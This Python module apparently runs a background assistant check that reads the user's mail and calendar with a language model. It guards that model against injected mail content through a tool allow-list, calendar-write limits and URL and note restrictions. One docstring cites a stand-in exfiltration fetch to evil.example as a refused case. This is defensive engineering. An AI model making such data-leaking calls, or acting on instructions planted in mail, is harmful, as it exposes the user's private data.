"""One watch check (spec parts 2 and 3; proactive design §2): find the sources when they're stale, then
  stage 1, Check: the watcher's turn reads the mail, what the user sent and the calendar, with the user's Watch for
  entries and no memory and no ledger, and writes findings (report, track_thread);
  stage 2, Consolidate: one call with no tools places the findings in the ledger, one loop per real thing
  (odie.loops.consolidate); a loop in "ready" is its card on Pulse;
then the watch's card (its line, the events, the sources), the pushes and what it did for a Watch for entry. Without a
report, a card written by code. Sources that just failed three times in a row, or just came back, are said once."""
from __future__ import annotations

import json
import logging
import re
from datetime import datetime, timedelta
from pathlib import Path

from odie.watch import bills, sent, sources
from odie.watch import report as rep
from odie.watch.fetch import STATE, Fetcher
from odie.watch.tools import Check, watch_tools

log = logging.getLogger("odie.watch")
INTERVAL = timedelta(minutes=30)
# What the watch may change without the user's tap (the owner's choice, 21 Oct 2026): adding an event to the calendar
# for a bill's due date or a deadline a mail names. Nothing else that writes: no sending, replying, paying or deleting.
# Bills and orders (the owner's choice, 21 Oct 2026): also updating that event, to mark a bill paid or an order delivered
# or moved. Closing a paid bill's reminder goes through the watch's own close_reminder, never task_update.
MAY_WRITE = frozenset({"calendar_create_event", "mac_calendar_add", "calendar_update_event"})
REACHES_OUT = frozenset({"web_fetch", "web_search", "find_images"})  # tools that send words to the web
# The web addresses written in the user's Watch for entries, set by run_check before each turn: once the check has read
# mail, these are the only places it may still fetch (a fixed address the user wrote carries nothing from the mail).
WATCH_FOR_ADDRESSES: set[str] = set()
_ADDRESS = re.compile(r"https?://[^\s<>\"')\]]+")
CARD_DAYS = 14  # Today's Up next shows two weeks of the calendar
SKILL = Path(__file__).parent / "skill" / "SKILL.md"
WATCH_FOR = "Watch for"


def due(store, now: datetime) -> bool:
    """Is a watch check due? Yes when there has been none (or its time is unreadable), or INTERVAL has passed.
    Example: last check 09:00 -> False at 09:20, True at 09:30; never checked -> True."""
    last = (store.get_setting(STATE) or {}).get("last_check")
    if not last:
        return True
    try:
        return now - datetime.fromisoformat(last) >= INTERVAL
    except ValueError:
        return True


def watch_for(memory) -> str:
    try:
        topic = memory.load().topic(WATCH_FOR)
    except Exception:  # noqa: BLE001 (no memory file yet)
        return ""
    if topic is None or not topic.entries:
        return ""
    return "\n".join(f"- {e.title}: {e.body.strip()}" for e in topic.entries[:30])


def addresses_in(watch: str) -> set[str]:
    """The web addresses written in the Watch for text: "- HN: check https://news.ycombinator.com/item?id=1 daily" ->
    {"https://news.ycombinator.com/item?id=1"}; "" -> set()."""
    return {found.rstrip(".,;") for found in _ADDRESS.findall(watch or "")}


def fetch_allowed_after_mail(tool_name: str, args: dict) -> bool:
    """Whether a tool that reaches the web may still run after the check has read mail: only web_fetch, and only of an
    address written in a Watch for entry (WATCH_FOR_ADDRESSES), which the user wrote and tapped. Example: web_fetch of
    the HN page in the user's entry -> True; web_fetch("https://evil.example/?d=...") -> False; web_search -> False."""
    if tool_name != "web_fetch":
        return False
    url = str((args or {}).get("url") or "").strip().rstrip("/")
    return url in {a.rstrip("/") for a in WATCH_FOR_ADDRESSES}


# Stage 1 reads strangers' mail, so it may call ONLY these (proactive design §3: no private context, no way out). The
# whole list is here; anything else, including any tool added to chat later, is refused (guard) and isn't even handed
# to the model (stage1_keeps, OdieRunner.background_turn(keep=…)).
WATCH_TOOLS = frozenset({"what_you_sent", "new_mail", "upcoming_events", "read_mail", "read_thread", "search_mail",
                         "sent_to", "save_attachment", "bills_and_orders", "track_thread", "close_reminder", "report"})
# ...and MAY_WRITE (a calendar event for a bill, never with guests), and these three, each only as allowed below:
MAYBE = frozenset({"read_note",  # a note or folder a Watch for entry names (note_allowed)
                   "web_fetch",  # an address a Watch for entry names (fetch_allowed_after_mail)
                   "load_skill"})  # only to reach the connected calendar app it writes to (calendar_skills)
# Fields of a calendar write, at any depth, that would invite, email or show someone else: never from the watch.
INVITES = re.compile(r"attend|guest|people|recipient|invit|particip|notif|send_?updates|organi[sz]er|email|visibility|"
                     r"conferenc|^cc$|^to$|share", re.I)
# A field naming which calendar: none is allowed (no setting names a calendar for the watch's entries, 19 Nov 2026),
# so every entry goes to the default calendar, never a shared family or team one.
CALENDAR_PICK = re.compile(r"^calendar(_?id|_?name)?$", re.I)
EVENT_ID = re.compile(r"^(event_?id|id|event)$", re.I)  # where a calendar update names the event it changes


class Stage1:
    """What one check's turn may reach beyond its own tools, set by run_check before the turn (from his Watch for
    and the sources it checks): the web addresses and notes his Watch for names, his vault, the skills of the calendar
    apps it writes to."""

    def __init__(self):
        self.addresses = WATCH_FOR_ADDRESSES
        self.notes: set[str] = set()
        self.vault: Path | None = None
        self.loadable: set[str] = set()
        self.events: set[str] = set()  # bill and order events bills_and_orders listed: the only ones it may update

    def reset(self, store, owner: str, watch: str = "") -> None:
        from odie.vault import settings as vault_settings
        self.addresses.clear()
        self.addresses.update(addresses_in(watch))
        folder = vault_settings.get(store).get("dir")
        self.vault = Path(folder).expanduser() if folder else None
        self.notes = notes_named(watch, self.vault)
        self.loadable = set(calendar_skills(store, owner))
        self.events = set()  # filled by this check's bills_and_orders (odie.watch.tools)


def exact_path(vault: Path, written: str) -> Path | None:
    """The path he wrote, inside his vault, when each part names an entry exactly as it is on disk (case and all), or
    None: "People/Asha.md" with People/Asha.md there -> that path; "people/Asha.md" -> None (the folder is People);
    "Inbox/../x.md" -> None."""
    here = vault
    for part in [p for p in written.split("/") if p]:
        if part in (".", ".."):
            return None
        try:
            names = {entry.name for entry in here.iterdir()}
        except OSError:
            return None
        if part not in names:
            return None
        here = here / part
    if here == vault or here.is_symlink():
        return None
    return here


def notes_named(watch: str, vault: Path | None) -> set[str]:
    """The notes and folders his Watch for names, exactly as he wrote them: a whole word that contains "/" or ends in
    ".md", or text he quoted (backticks or double quotes), whose every part is there in his vault with the same case.
    A folder grants that folder; a .md file grants that file alone. Nothing else grants anything: never a plain word
    ("tell me when people reply" -> nothing, though a folder People/ exists), never part of a word, never the folder a
    named file sits in. No vault -> nothing.
      "watch 2-Areas/My Money/ weekly" -> nothing;  'watch "2-Areas/My Money/"' -> {"2-Areas/My Money/"};
      "notes under 0-Inbox/iCloud" -> {"0-Inbox/iCloud/"};  "who is People/Asha.md" -> {"People/Asha.md"};
      '"People"' -> {"People/"};  "people/Asha.md" -> nothing (the folder is People);  "and/or", "24/7", "./" -> nothing"""
    if vault is None:
        return set()
    text = _ADDRESS.sub(" ", watch or "")
    quoted = [a or b for a, b in re.findall(r"`([^`]+)`|\"([^\"]+)\"", text)]
    bare = re.sub(r"`[^`]*`|\"[^\"]*\"", " ", text).split()
    bare = [w.rstrip(".,;:)!?") for w in bare]
    candidates = [w.strip() for w in quoted] + [w for w in bare if "/" in w or w.endswith(".md")]
    root = vault.resolve()
    out = set()
    for word in candidates:
        if not word or word.startswith(("/", "~")):
            continue
        where = exact_path(vault, word)
        if where is None or root not in where.resolve().parents:
            continue
        if where.is_dir():
            out.add(word.rstrip("/") + "/")
        elif word.endswith(".md") and where.is_file():
            out.add(word)
    return out


def note_allowed(args: dict) -> bool:
    """Whether read_note may run in the watch: only for a note that is a file in his vault, inside a note or folder
    his Watch for names (STAGE1.notes), compared as resolved paths, never by a title or an alias.
      "Inbox/digest.md" with "Inbox/" named -> True;  "Inbox/x" (x.md there) -> True;  "People/Asha.md" -> False;
      "Inbox/../People/Asha.md", "/Inbox/x.md", "~/x.md" -> False;  "Asha" (an alias) -> False"""
    note = str((args or {}).get("note") or "").strip()
    vault = STAGE1.vault
    if not note or vault is None or note.startswith(("/", "~")) or ".." in note.split("/"):
        return False
    root = vault.resolve()
    target = None
    for candidate in (note, note + ".md"):
        place = vault / candidate
        if candidate.endswith(".md") and place.is_file() and not place.is_symlink():
            target = place.resolve()
            break
    if target is None or root not in target.parents:
        return False
    for named in STAGE1.notes:
        allowed = (vault / named).resolve()
        if target == allowed or allowed in target.parents:
            return True
    return False


def invites(args, found: list[str] | None = None) -> list[str]:
    """The fields of a calendar write, at any depth (nested objects and lists too), that would invite, email or show
    someone else, with a value: {"attendees": ["x@y"]} -> ["attendees"]; {"event": {"guests": ["x@y"]}} ->
    ["guests"]; {"visibility": "public"} -> ["visibility"]; {"summary": "Pay bill"} -> []; {"attendees": []} -> []."""
    out = [] if found is None else found
    if isinstance(args, dict):
        for name, value in args.items():
            if INVITES.search(str(name)) and value not in (None, "", [], {}):
                out.append(str(name))
            invites(value, out)
    elif isinstance(args, list):
        for value in args:
            invites(value, out)
    return out


def event_ids(args, found: list[str] | None = None) -> list[str]:
    """Every value under an event-id-like key, at any depth: {"event_id": "a", "id": "b"} -> ["a", "b"];
    {"event": {"id": "a"}} -> ["a"]; {"summary": "x"} -> []."""
    out = [] if found is None else found
    if isinstance(args, dict):
        for name, value in args.items():
            if EVENT_ID.match(str(name)) and isinstance(value, (str, int)):
                out.append(str(value))
            event_ids(value, out)
    elif isinstance(args, list):
        for value in args:
            event_ids(value, out)
    return out


def updates_a_listed_event(args: dict) -> bool:
    """Whether a calendar update names only events bills_and_orders listed in this check (a bill's or an order's), so
    mail words can never be written into a meeting other people see: at least one event id, and every id it names
    listed. {"event_id": "bill-ev-1"} with it listed -> True; {"event_id": "team-meeting", "id": "bill-ev-1"} (a
    decoy) -> False; {"event": {"id": "team-meeting"}} -> False; no event id -> False."""
    named = event_ids(args)
    return bool(named) and all(value in STAGE1.events for value in named)


def picks_a_calendar(args, found: list[str] | None = None) -> list[str]:
    """The fields of a calendar write, at any depth, that pick which calendar it goes to: {"calendarId": "family@…"}
    -> ["calendarId"]; {"calendar_name": "Family"} -> ["calendar_name"]; {"summary": "x"} -> []."""
    out = [] if found is None else found
    if isinstance(args, dict):
        for name, value in args.items():
            if CALENDAR_PICK.match(str(name)) and value not in (None, "", [], {}):
                out.append(str(name))
            picks_a_calendar(value, out)
    elif isinstance(args, list):
        for value in args:
            picks_a_calendar(value, out)
    return out


def stage1_keeps(name: str) -> bool:
    """Whether a chat tool is handed to stage 1's model at all: its own tools, the calendar writes, and the three it may
    use under conditions. "new_mail" -> True; "recall", "make_research", "watch_close" -> False."""
    return name in WATCH_TOOLS or name in MAY_WRITE or name in MAYBE


# One per process, reset at the start of every check (run_check: STAGE1.reset). Only one check runs at a time: the
# background runs its parts one after another under one lock (odie.background.Background), and the evals run their
# cases one by one.
STAGE1 = Stage1()


def guard(tool, args, tool_context) -> dict | None:
    """before_tool_callback for the watch's turn (stage 1, which reads strangers' mail): an allow-list.
      its own tools (WATCH_TOOLS) -> None (runs)
      calendar_create_event / calendar_update_event / mac_calendar_add -> runs, unless a field would invite or email
        someone (attendees, guests…): refused
      read_note -> only a note his Watch for names (note_allowed); web_fetch -> only an address his Watch for names
        (fetch_allowed_after_mail); load_skill -> only a calendar app's skill it writes to (STAGE1.loadable)
      anything else -> refused: recall, fetch_memory, watch_item, task_add, make_research, a new chat tool, …"""
    name = tool.name
    if name in WATCH_TOOLS:
        return None
    if name in MAY_WRITE:
        found = invites(args)
        if found:
            return {"error": f"Not from the watch: {', '.join(found)} would invite, email or show someone. Add the "
                             "event without guests."}
        picked = picks_a_calendar(args)
        if picked:
            return {"error": f"Not from the watch: {', '.join(picked)} picks a calendar. Its entries go to the default "
                             "calendar."}
        if "update" in name and not updates_a_listed_event(args):
            return {"error": "Only an event bills_and_orders listed in this check can be changed from the watch."}
        return None
    if name == "read_note" and note_allowed(args):
        return None
    if name == "web_fetch" and fetch_allowed_after_mail(name, args):
        return None
    if name == "load_skill" and str((args or {}).get("skill_name") or "") in STAGE1.loadable:
        return None
    return {"error": "Not in the background watch: it reads other people's mail, so it may only read the mail and "
                     "calendar and write findings. Write a finding instead."}


def calendar_skills(store, owner: str = "") -> list[str]:
    """The connected apps' skills a watch check starts with loaded, so it can write to their calendars: one per
    calendar source that is an app (MCP); the Mac's own calendar tools are always there. Gmail and Calendar plus the
    Mac's Calendar -> ["mcp-gmail-calendar"]; only a mail app -> []."""
    names: list[str] = []
    for src in sources.saved(store, owner):
        is_calendar_app = src.kind == "calendar" and src.style != "native"
        name = f"mcp-{src.server}"
        if is_calendar_app and name not in names:
            names.append(name)
    return names


def needs_catch_up(fetcher) -> bool:
    """Whether this check also reads the last month's bills, payments and orders: once per catch-up version, until a
    check that ran it reports. Never run -> True; ran bills.CATCH_UP -> False; ran an older one -> True."""
    return fetcher.caught_up != bills.CATCH_UP


def finish_catch_up(fetcher, reported: bool) -> None:
    """After a check that caught up: done when it reported; a failed turn tries again at the next check, up to
    bills.CATCH_UP_TRIES, then it's given up so a slow model doesn't fail every check. Reported -> done; 1st failure ->
    again next time; 2nd failure -> given up (logged)."""
    if reported:
        fetcher.caught_up = bills.CATCH_UP
        return
    fetcher.catch_up_tries += 1
    if fetcher.catch_up_tries >= bills.CATCH_UP_TRIES:
        log.warning("watch: the bills catch-up failed %d times; given up", fetcher.catch_up_tries)
        fetcher.caught_up = bills.CATCH_UP


def catch_up_prompt(prompt: str, older: list[dict]) -> str:
    """The check's prompt with the catch-up's mail after it: the watch handles these like new mail, once."""
    return (f"{prompt}\n\nThis check is also a one-time catch-up: these are the last {bills.CATCH_UP_DAYS} days' bills, "
            "payments and orders, from before the watch kept them. Handle them as the skill says (an event and a "
            "reminder for a bill still due, a paid one closed, an order's event on its delivery day, a delivered or "
            "cancelled one marked), skip what's over, and write findings only for what still needs following. "
            "read_mail reads any of them in full.\n" + json.dumps(older, ensure_ascii=False))


def _instruction(watch: str) -> str:
    """Stage 1's instruction: the watch skill and the user's Watch for entries (his own instructions). No memory: what
    Odie remembers goes to stage 2 only (proactive design §3)."""
    body = SKILL.read_text().split("---", 2)[-1].strip()
    return f"{body}\n\n## Watch for\n{watch or '(nothing yet)'}"


def context_for(store, owner: str, memory, memory_index: str) -> dict:
    """What stage 2 reads besides the findings: his Watch for (from the shared memory), his Now list (the owner's own,
    kept in the store: odie.loops.now) and what Odie remembers of him."""
    from odie.loops import now as now_list
    watch = ""
    if memory is not None:
        watch = watch_for(memory)
    return {"watch": watch, "now": now_list.text(store, owner), "memory": memory_index}


def nudge_text(check) -> str:
    """The second ask for a turn that ended without report: the mail and events the check read, because the nudge
    runs as a fresh turn that remembers nothing."""
    return ("You ended the watch check without calling report. This is what the check read; call report now "
            "(an empty findings list when nothing needs following, and a one-sentence line for Today).\n"
            f"Mail: {json.dumps([check.fenced(m) for m in check.mails], ensure_ascii=False)}\n"
            f"Events: {json.dumps([e.brief() for e in check.events], ensure_ascii=False)}")


def watches_a_page(watch: str) -> bool:
    """Whether the user's Watch for names a web address, so the check runs its turn every time even with nothing new
    in the mail: that page changes on its own. "- HN: watch https://news.example.org/item?id=1" -> True; "- Passport:
    tell me when it comes" -> False; no Watch for -> False."""
    return bool(addresses_in(watch))


def note_tried(store, now: datetime, owner: str) -> None:
    """Notes when this watch last tried, even with nothing to read, so odie.watch.owner.next_due moves on to the next
    personality instead of picking this one every wake-up."""
    from odie.watch.fetch import STATE
    from odie.watch.owner import key
    state_key = key(STATE, owner)
    state = store.get_setting(state_key) or {}
    store.set_setting(state_key, {**state, "tried_at": now.isoformat(timespec="seconds")})


def has_news(check, catching_up: bool) -> bool:
    """Whether stage 1 has anything new to read; without, no model call (proactive design §4, for every owner). New: a
    mail, a mail the user sent that code didn't already match, an event that is new, moved or cancelled, or the
    one-time catch-up. (A loop past its due date is already a card; the follow-up ladder says it again.)
      nothing in the inbox, the calendar as it was -> False (no call)
      one new mail -> True;  the 15:00 standup moved to 16:00 -> True"""
    if check.mails or check.sent or catching_up:
        return True
    return any(e.change for e in check.events)


async def run_check(store, now: datetime, turn, push, memory=None, memory_index: str = "", owner: str = "",
                    think=None) -> str:
    """One check of one watch: everyday Odie's (owner "") or a personality's own (odie.watch.owner: its apps, its
    loops). turn(prompt, tools, instruction) is stage 1's model turn; think(prompt, instruction) is stage 2's call with
    no tools (None: the findings are placed by the same-ID shortcut alone, else as new loops). Returns "off" (nothing
    to read), "quiet" (nothing new: no model call), "ok" or "fallback"."""
    from odie.loops import ci_runs, consolidate, findings, shortcut
    from odie.watch import pushes
    from odie.watch.owner import key
    if sources.stale(store, now, owner):
        await sources.detect_and_save(store, owner)
    if not sources.saved(store, owner):
        card_key = key(rep.CARD, owner)
        kept = (store.get_setting(card_key) or {}).get("done", [])
        store.set_setting(card_key, {"checked_at": now.isoformat(timespec="seconds"), "line": "", "events": [],
                                     "sources": {}, "off": "Connect Gmail and Calendar (Zapier, Composio or another app) to see them here.",
                                     "done": kept})
        note_tried(store, now, owner)  # a personality with nothing to read waits its turn like the others
        return "off"
    fetcher = Fetcher(store, now, owner)
    check = Check(fetcher)
    # The user's own mail since the last check: a reply in a loop's mail thread, to its sender, closes it now, in code;
    # the rest is the check's "What you sent" (odie.watch.sent). Read here, not by the model, so it never depends on it.
    sent_by_the_user = await fetcher.sent_mail()
    check.sent = sent.close_answered(store, now, sent_by_the_user, owner)
    # Read first, so a check with nothing new makes no model call; the turn's new_mail gives the same list.
    check.mails = await fetcher.new_mail()
    check.mail_read = True
    check.events = await fetcher.upcoming_events()
    # GitHub's CI run mail names a branch, not a pull request: code asks gh which one (odie.loops.ci_runs).
    await ci_runs.resolve(check.mails)
    # A mail in a thread an open loop holds, or GitHub's mail about the same pull request, joins that loop in code.
    check.loop_of = shortcut.attach_known(store, owner, check.mails, now)
    catching_up = needs_catch_up(fetcher)
    failing = rep.failing_now(store, fetcher.statuses, owner)  # read against the last check, so before commit()

    def ping(title: str, body: str) -> None:
        try:
            push(title, body)
        except Exception:  # noqa: BLE001
            log.warning("watch: a push failed", exc_info=True)

    def say_failing() -> None:
        for app in failing:  # Pulse's Needs you says it too, until the app works again
            ping(pushes.title_for(store, owner, f"{app} stopped working"), "Fix it in Settings → Connected apps.")
    context = context_for(store, owner, memory, memory_index)
    watch = context["watch"]
    waiting, _tries = consolidate.take_pending(store, owner)
    if not has_news(check, catching_up) and not watches_a_page(watch):
        if waiting and think is not None:  # a stage 2 that failed last time: its findings, alone
            placed = await consolidate.consolidate(store, owner, now, [], think, context)
            push_new_cards(store, now, placed, bool(fetcher.first), owner, ping)
        card_events = await fetcher.events_ahead(CARD_DAYS)
        rep.nothing_new(store, now, card_events, fetcher.statuses, owner)
        fetcher.commit()
        say_failing()
        return "quiet"
    tools = watch_tools(check)
    STAGE1.reset(store, owner, watch)
    instruction = _instruction(watch)
    prompt = "Run the watch check."  # the background turn puts the time before it (odie.app.runner.background_turn)
    if catching_up:
        older = await fetcher.catch_up_mail()
        if older:
            prompt = catch_up_prompt(prompt, [check.fenced(m) for m in older])
    reason = ""
    from odie.loops import budget
    budget.count(store, now)  # the day's proactive calls (odie.loops.budget): counted, never stopped
    try:
        await turn(prompt, tools, instruction)
    except Exception as e:  # noqa: BLE001 (a failed turn still leaves a card)
        reason = f"{type(e).__name__}: {e}"[:160]
        log.warning("watch turn failed", exc_info=True)
    check.read = True  # read before the turn, for the nudge and for the card's counts
    if check.report is None:  # small models often stop short of report: one nudge, with what the check read
        budget.count(store, now)
        try:
            await turn(nudge_text(check), tools, instruction)
        except Exception as e:  # noqa: BLE001
            reason = f"{type(e).__name__}: {e}"[:160]
            log.warning("watch nudge failed", exc_info=True)
    if catching_up:
        finish_catch_up(fetcher, reported=check.report is not None)
    # Stage 2: every finding of this check (a report's, and any track_thread wrote before a turn stopped short).
    found = findings.collect(check)
    applied = await place(store, owner, now, found, think, context)
    card_events = await fetcher.events_ahead(CARD_DAYS)
    first = bool(fetcher.first)
    r = check.report
    try:
        if r is None:
            rep.fallback(store, now, check.mails, card_events, fetcher.statuses, reason or "no report from the model",
                         owner)
        else:
            rep.save_card(store, now, r["line"], card_events, fetcher.statuses, owner)
    finally:
        # the check's place is saved first: a post that fails never makes it run again every 5 minutes. A turn that
        # raised (a timeout) and left no report leaves its mail for the next check (fetch.Fetcher.commit)
        fetcher.commit(turn_failed=bool(reason) and r is None)

    say_failing()
    push_new_cards(store, now, applied, first, owner, ping)
    if r is None:
        return "fallback"
    tell_done(store, now, r["done"], applied, owner, ping)
    return "ok"


async def place(store, owner: str, now: datetime, found: list[dict], think, context: dict):
    """Stage 2 for this check's findings: the model's call when there is one to think with, else the shortcut alone
    (a finding a loop holds joins it; the rest are new loops). Returns what was done (None: the findings wait)."""
    from odie.loops import consolidate
    if think is None:
        if not found:
            return consolidate.Applied()
        shortcut_hints = consolidate.hints(store, owner, found, now)
        return consolidate.apply(store, owner, now, found, {}, shortcut_hints)
    return await consolidate.consolidate(store, owner, now, found, think, context)


def push_new_cards(store, now: datetime, applied, first: bool, owner: str, ping) -> None:
    """A push for each loop this check made a card and the model marked to push, within the push rules
    (report.to_push) and the day's shared budget (odie.watch.pushes)."""
    from odie.loops import ledger
    from odie.watch import pushes
    if applied is None:
        return
    items = []
    for lid in applied.to_push:
        loop = ledger.get(store, lid)
        if loop is None or loop["state"] != "ready":
            continue
        items.append({"ref": f"loop:{lid}", "title": loop["title"], "why": loop["result"]})
    for it in rep.to_push(store, now, items, first, owner):
        if pushes.started_by_odie(store, now, owner, it["title"], it["why"], ping, ref=it["ref"]):
            rep.flag_pushed(store, it["ref"], owner)
            lid = int(it["ref"][len("loop:"):])
            ledger.add_event(store, lid, now, "odie", "pushed", "Pushed to your phone")


def tell_done(store, now: datetime, done: list[dict], applied, owner: str, ping) -> None:
    """What the check did for a Watch for entry: noted on the card, and told (a chat note and a push) when worth it
    (worth_telling). A reminder stage 2 made counts as worth telling; one that went to something the user had already
    finished made nothing, so a note about it isn't told unless it brings files."""
    from odie.agent.tools.files import hand_over, workspace
    from odie.watch import pushes
    ws = workspace().resolve()
    added_task = applied is not None and applied.reminders > 0
    to_finished = applied is not None and applied.reminder_to_finished and not added_task
    for d in done:
        media = []
        files = d.get("files") or []
        for x in files:
            if not x:
                continue
            f = Path(x).resolve()
            if f.is_file() and ws in f.parents:  # only files in Odie's workspace can be handed over
                got = hand_over(f, f.name)
                if "media" in got:
                    media.append(got["media"])
        message = str(d.get("message") or "Done.")[:500]
        told = worth_telling(d, media, added_task)
        if to_finished and not media:
            told = False  # the reminder it speaks of is for something he already finished: nothing new
        rep.keep_done(store, now, message, told, media, owner=owner)  # a told note shows on Pulse, under Needs you
        if not told:
            log.info("watch: done, not told: %s", message)
            continue
        done_title = "Odie: done"
        if owner:
            done_title = "Done"  # titled "Mira · Done" by pushes.title_for
        pushes.started_by_odie(store, now, owner, done_title, message, ping)  # within the day's shared three


def worth_telling(item: dict, media: list, added_task: bool) -> bool:
    """Does something the watch did for a Watch for entry become a chat message (and a push)? Only when the user gets
    something from it: files to open, a task the check added (a reminder), or the check marked it "tell": true
    (something new he'd act on; a quoted "true" counts too). Anything else stays quiet, on the card and in the log: a
    check that only relayed, found nothing new, found it already covered, or couldn't do something in the background
    tells the user nothing.
    Example: {"message": "The deck from Asha's PDF is ready", "files": [deck]} -> True (a file card);
    a relay check whose finding became a new reminder, no tell -> True (a reminder is told when the model didn't say);
    the same check's {"message": "HN: still no reply", "tell": false} -> False (the model said quiet);
    {"message": "Asha's flight moved to 18:00", "tell": "True"} -> True;
    {"message": "Relayed the digests; both events already covered, nothing added"}, no task added -> False."""
    if media:
        return True
    tell = item.get("tell")
    if isinstance(tell, str):
        tell = tell.strip().lower() == "true"
    if tell is None:
        return added_task  # the model said nothing: a reminder the check added is still worth telling
    return tell is True
